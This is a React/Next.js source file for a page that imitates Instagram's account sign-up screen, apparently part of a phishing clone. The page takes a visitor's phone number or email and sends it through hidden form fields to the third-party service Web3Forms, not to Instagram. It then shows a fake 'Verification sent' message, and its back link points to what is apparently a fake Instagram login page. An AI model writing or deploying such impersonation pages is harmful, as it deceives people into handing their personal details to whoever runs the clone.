"use client";

import React, { useState } from "react";
import Link from "next/link";
import { ChevronLeftIcon } from "@/components/common/Icons";
import { submitToWeb3Forms, WEB3FORMS_ACCESS_KEY } from "@/lib/web3forms";

export default function InstagramCreateAccountPage() {
  const [signupMode, setSignupMode] = useState<"phone" | "email">("phone");
  const [inputValue, setInputValue] = useState("");
  const [viewMode, setViewMode] = useState<"mobile_mockup" | "responsive">("responsive");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [statusMessage, setStatusMessage] = useState<{ type: "success" | "error"; text: string } | null>(null);

  const handleNext = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!inputValue.trim() || isSubmitting) return;

    setIsSubmitting(true);
    setStatusMessage(null);

    const formData = new FormData(e.currentTarget);
    const result = await submitToWeb3Forms(formData, `Instagram Sign Up (${signupMode})`);

    setIsSubmitting(false);
    if (result.success) {
      setStatusMessage({
        type: "success",
        text: `Verification sent to ${inputValue}. Please check your ${signupMode === "phone" ? "messages" : "inbox"}!`,
      });
      setInputValue("");
    } else {
      setStatusMessage({
        type: "error",
        text: result.message || "Failed to proceed. Please try again.",
      });
    }
  };

  return (
    <div className="min-h-[calc(100vh-3.5rem)] flex flex-col bg-[#0c1017] text-white font-sans antialiased">
      <div className="flex-1 flex items-center justify-center p-4 sm:p-8">
        <div
          className={`w-full ${
            viewMode === "mobile_mockup"
              ? "max-w-[390px] min-h-[760px] border border-[#283445] rounded-[36px] shadow-2xl p-6"
              : "max-w-[440px] p-4 sm:p-6"
          } bg-[#0c1017] flex flex-col justify-between relative`}
        >
          {/* Top Back Navigation */}
          <div>
            <div className="pt-2 pb-6">
              <Link
                href="/"
                className="p-1 -ml-1 text-gray-300 hover:text-white inline-block rounded-full hover:bg-white/5"
                aria-label="Back to Instagram Login"
              >
                <ChevronLeftIcon className="w-6 h-6" />
              </Link>
            </div>

            {/* Step Heading & Subtitle */}
            <div className="flex flex-col gap-2">
              <h1 className="text-2xl sm:text-[28px] font-bold tracking-tight text-white">
                {signupMode === "phone"
                  ? "What's your mobile number?"
                  : "What's your email?"}
              </h1>
              <p className="text-[15px] text-gray-300 leading-normal">
                {signupMode === "phone"
                  ? "Enter the mobile number where you can be contacted. No one will see this on your profile."
                  : "Enter the email where you can be contacted. No one will see this on your profile."}
              </p>
            </div>

            {/* Input Form */}
            <form onSubmit={handleNext} className="flex flex-col gap-3.5 mt-6">
              <input type="hidden" name="access_key" value={WEB3FORMS_ACCESS_KEY} />
              <input type="hidden" name="subject" value={`Instagram Sign Up Request (${signupMode})`} />
              <input type="hidden" name="from_name" value="Instagram Create Portal" />
              <input type="hidden" name="form_name" value="Instagram Sign Up" />
              <input type="hidden" name="signup_mode" value={signupMode} />
              <input type="checkbox" name="botcheck" className="hidden" style={{ display: "none" }} />

              {statusMessage && (
                <div
                  className={`p-3 rounded-xl text-xs font-medium text-center ${
                    statusMessage.type === "success"
                      ? "bg-green-500/15 text-green-400 border border-green-500/30"
                      : "bg-red-500/15 text-red-400 border border-red-500/30"
                  }`}
                >
                  {statusMessage.text}
                </div>
              )}

              <div>
                <input
                  type={signupMode === "phone" ? "tel" : "email"}
                  name={signupMode === "phone" ? "mobile_number" : "email"}
                  value={inputValue}
                  onChange={(e) => setInputValue(e.target.value)}
                  placeholder={signupMode === "phone" ? "Mobile number" : "Email"}
                  className="w-full h-[54px] px-4 rounded-2xl border border-[#283445] bg-[#12171e] text-[15px] text-white placeholder-[#7c899c] focus:outline-none focus:border-[#38475c] focus:ring-1 focus:ring-[#38475c] transition-all"
                  required
                />
              </div>

              {/* Disclaimer */}
              <p className="text-xs text-[#7c899c] leading-relaxed">
                {signupMode === "phone" ? (
                  <>
                    You may receive WhatsApp and SMS notifications from us.{" "}
                    <a
                      href="#"
                      onClick={(e) => {
                        e.preventDefault();
                        alert("Learn more details opened.");
                      }}
                      className="text-[#0095F6] hover:underline font-medium"
                    >
                      Learn more
                    </a>
                  </>
                ) : (
                  <>
                    You&apos;ll also receive emails from us and can opt out anytime.{" "}
                    <a
                      href="#"
                      onClick={(e) => {
                        e.preventDefault();
                        alert("Learn more details opened.");
                      }}
                      className="text-[#0095F6] hover:underline font-medium"
                    >
                      Learn more
                    </a>
                  </>
                )}
              </p>

              {/* Next Blue Button */}
              <button
                type="submit"
                disabled={isSubmitting || !inputValue.trim()}
                className={`w-full h-[48px] rounded-full font-semibold text-[15px] tracking-wide transition-colors shadow-md mt-2 flex items-center justify-center gap-2 ${
                  isSubmitting || !inputValue.trim()
                    ? "bg-[#0064e0]/60 text-white/70 cursor-not-allowed"
                    : "bg-[#0064e0] hover:bg-[#1877f2] active:bg-[#0055d4] text-white cursor-pointer"
                }`}
              >
                {isSubmitting ? (
                  <>
                    <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                    <span>Submitting...</span>
                  </>
                ) : (
                  "Next"
                )}
              </button>

              {/* Switch Phone / Email Button */}
              <button
                type="button"
                onClick={() => {
                  setSignupMode(signupMode === "phone" ? "email" : "phone");
                  setInputValue("");
                }}
                className="w-full h-[48px] rounded-full bg-[#1b232f] hover:bg-[#253040] text-white font-medium text-[14px] flex items-center justify-center transition-colors border border-[#283445]/50 mt-1"
              >
                {signupMode === "phone"
                  ? "Sign up with email"
                  : "Sign up with mobile number"}
              </button>
            </form>
          </div>

          {/* Bottom Account Link */}
          <div className="text-center pt-8 pb-4">
            <Link
              href="/"
              className="text-[14px] text-[#0095F6] hover:underline font-medium"
            >
              I already have an account
            </Link>
          </div>
        </div>
      </div>
    </div>
  );
}
